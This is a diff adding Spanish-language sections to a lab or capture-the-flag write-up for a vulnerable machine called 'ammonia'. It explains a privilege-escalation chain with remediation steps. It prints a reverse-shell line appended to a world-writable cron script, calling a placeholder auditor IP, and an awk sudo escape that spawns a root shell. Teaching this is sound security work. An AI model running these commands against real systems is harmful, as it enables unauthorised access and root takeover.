@@ -601,14 +601,83 @@ haber_fritz@ammonia:~$
 
 #### haber_fritz
 
+```bash
 haber_fritz@ammonia:~$ sudo -l
 [sudo] password for haber_fritz:
 Sorry, user haber_fritz may not run sudo on ammonia.
-
+```
 #### clara_immerwahr
 
+```bash
+clara_immerwahr@ammonia:/$ sudo -l
+Matching Defaults entries for clara_immerwahr on ammonia:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User clara_immerwahr may run the following commands on ammonia:
+    (ALL) NOPASSWD: /usr/bin/awk
+```
+- 1. Qué comandos puede ejecutar cada usuario
+  - haber_fritz: No tiene permitido ejecutar ningún comando con privilegios de superusuario. El sistema deniega explícitamente su interacción con el binario sudo.
+
+  - clara_immerwahr: Tiene autorización exclusiva para ejecutar el binario /usr/bin/awk con los privilegios de cualquier usuario del sistema (ALL), incluyendo a root.
+
+- 2. Si necesita contraseña
+  - haber_fritz: No aplica (acceso prohibido).
+
+  - clara_immerwahr: No necesita contraseña (NOPASSWD). Puede invocar la herramienta de procesamiento de texto awk de manera inmediata sin que el sistema valide su identidad mediante un prompt de credenciales.
+
+- 3. Si los permisos son adecuados o inseguros
+  - La configuración de haber_fritz es adecuada y segura, ya que garantiza el principio de menor privilegio para la cuenta de entrada al laboratorio.
+
+  - La configuración de clara_immerwahr es críticamente insegura en un entorno de producción real, pero está diseñada de forma excelente para el propósito del reto. awk posee directivas internas (como system()) que permiten interactuar de forma nativa con el sistema operativo subyacente.
+
+- 4. Si forman parte de la escalada de privilegios
+Esto constituye el vector definitivo de escalada de privilegios vertical (Salto a Root).
+Al tener acceso irrestricto a /usr/bin/awk sin contraseña, el alumno (tras haber tomado control de la cuenta de Clara) puede explotar la debilidad del binario para forzar la apertura de una shell interactiva que heredará automáticamente el UID de la identidad ejecutora (root). La línea de explotación exacta que completará el reto es: `sudo awk 'BEGIN {system("/bin/bash")}'`
+
+- 5. Cómo deberían corregirse
+Para mitigar esta vulnerabilidad en un entorno empresarial y securizar por completo la directiva, se deberían aplicar las siguientes contramedidas de hardening:
+
+  - Eliminar la directiva NOPASSWD: Forzar siempre la re-autenticación del usuario para mitigar ataques basados en el secuestro de sesiones o movimientos laterales automáticos.
+
+  - Restringir los binarios peligrosos: Sustituir o suprimir la regla del archivo /etc/sudoers que delega el uso de aplicaciones con capacidad de evasión (GTFOBins). Si un usuario requiere procesar texto, se deben delegar scripts o herramientas específicas cerradas que no permitan la ejecución de comandos de sistema (system()).
 
 ### 5.7. Relación con la vulnerabilidad
+
+El diseño de la máquina vulnerable ammonia no depende de un exploit de software desactualizado, sino de un encadenamiento de malas configuraciones lógicas de permisos (Chain Exploitation). A continuación, se detallan los dos vectores que articulan el reto.
+
+#### Vector 1: Movimiento Lateral (De haber_fritz a clara_immerwahr)
+- 1. Qué usuario o recurso está afectado: 
+El recurso afectado es el script de automatización alojado en /opt/scripts/backup.sh (o equivalente), el cual es ejecutado periódicamente por una tarea programada (Cronjob) bajo el contexto de seguridad de la usuaria clara_immerwahr.
+
+- 2. Qué permiso se ha configurado incorrectamente: 
+Se ha aplicado un bit de permisos global laxo -rwxrwxrwx (777) sobre el archivo del script. Esto otorga privilegios de escritura a cualquier usuario del sistema (Others), rompiendo el aislamiento entre cuentas.
+
+- 3. Cómo puede aprovecharse: 
+El alumno, tras acceder como el usuario inicial haber_fritz, inspecciona el script y detecta que puede editarlo. Aprovechando esto, inyecta una línea de código (como una reverse shell o una copia de /bin/bash con permisos especiales) dentro del archivo: `echo "bash -i >& /dev/tcp/IP_AUDITOR/PUERTO 0>&1" >> /opt/scripts/backup.sh`. Al cabo de un minuto, el demonio cron ejecuta de forma automática el script modificado con la identidad de clara_immerwahr, otorgando al auditor una consola con los privilegios de esta usuaria.
+
+- 4. Qué impacto tiene: 
+Pivoting / Movimiento lateral exitoso que permite evadir el entorno restringido de haber_fritz y suplantar la identidad de una usuaria con mayores prerrogativas en el sistema sin necesidad de conocer su contraseña.
+
+- 5. Cómo se corregiría: Se debe aplicar el principio de menor privilegio sobre el archivo del script, restringiendo la escritura únicamente al propietario legítimo o al administrador:
+
+```bash
+sudo chmod 755 /opt/scripts/backup.sh
+sudo chown root:root /opt/scripts/backup.sh
+```
+
+#### Vector 2: Escalada de Privilegios Vertical (De clara_immerwahr a root)
+
+- 1. Qué usuario o recurso está afectado
+La directiva de privilegios del archivo de configuración de sudoers (/etc/sudoers) asociada a la usuaria clara_immerwahr.
+
+- 2. Qué permiso se ha configurado incorrectamente
+Se ha configurado una regla de ejecución delegada extremadamente permisiva y sin validación de credenciales: `clara_immerwahr ALL=(ALL) NOPASSWD: /usr/bin/awk`
+
+- 3. Cómo puede aprovecharse: 
+Al tomar control de la cuenta de Clara, el auditor ejecuta sudo -l y descubre la regla. Dado que awk pertenece a la categoría de binarios con capacidad de evasión de seguridad (GTFOBins), el auditor aprovecha su funcionalidad nativa para invocar comandos del sistema y spawnear una consola como superusuario:
+
 ### 5.8. Comprobación final
 
 ---
